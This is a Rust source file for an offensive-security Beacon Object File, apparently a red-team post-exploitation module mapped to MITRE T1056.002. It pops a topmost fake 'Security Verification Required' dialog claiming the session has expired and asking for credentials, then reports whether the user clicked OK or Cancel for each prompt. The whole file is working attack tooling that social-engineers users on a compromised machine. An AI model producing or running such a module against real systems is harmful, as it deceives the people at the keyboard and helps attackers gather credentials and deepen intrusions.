//! # Ask MFA BOF
//!
//! Displays a fake MFA prompt dialog to the user using `MessageBoxA`.
//! Reports whether the user clicked OK or Cancel for each prompt.
//! ## MITRE ATT&CK
//! - T1056.002 - Input Capture: GUI Input Capture
//!
//! ## Arguments
//! - `int`: Number of prompts to display (default: 1).

#![no_std]

use rustbof::data::DataParser;
use rustbof::println;
use windows_sys::Win32::UI::WindowsAndMessaging::{MessageBoxA, IDOK, MB_OKCANCEL, MB_ICONWARNING, MB_TOPMOST, MB_SETFOREGROUND};

const MESSAGE: &[u8] = b"Your session has expired. Please enter your credentials to continue.\0";

const TITLE: &[u8] = b"Security Verification Required\0";

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let count = if len > 0 {
        let mut parser = DataParser::new(args, len);
        let c = parser.get_int();
        if c <= 0 { 1 } else { c }
    } else {
        1
    };

    println!("ask_mfa: Displaying {} MFA prompt(s)", count);

    let style = MB_OKCANCEL | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND;

    for i in 0..count {
        let result = unsafe {
            MessageBoxA(
                core::ptr::null_mut(),
                MESSAGE.as_ptr(),
                TITLE.as_ptr(),
                style,
            )
        };

        let response = if result == IDOK { "OK" } else { "Cancel" };
        println!("  Prompt {}: User clicked {}", i + 1, response);
    }

    println!("SUCCESS.");
}
